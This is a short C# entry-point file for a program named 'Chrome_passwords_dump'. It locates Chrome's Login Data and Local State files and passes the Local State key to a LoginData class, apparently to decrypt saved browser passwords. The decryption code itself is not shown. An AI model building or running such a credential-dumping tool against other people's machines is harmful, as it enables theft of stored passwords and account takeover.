using System;

namespace Chrome_passwords_dump
{
    class Program
    {
        static void Main(string[] args)
        {
            new LoginData(Finder.GetLoginDataFile(), new LocalState(Finder.GetLocalStateFile()).Key);
        }
    }
}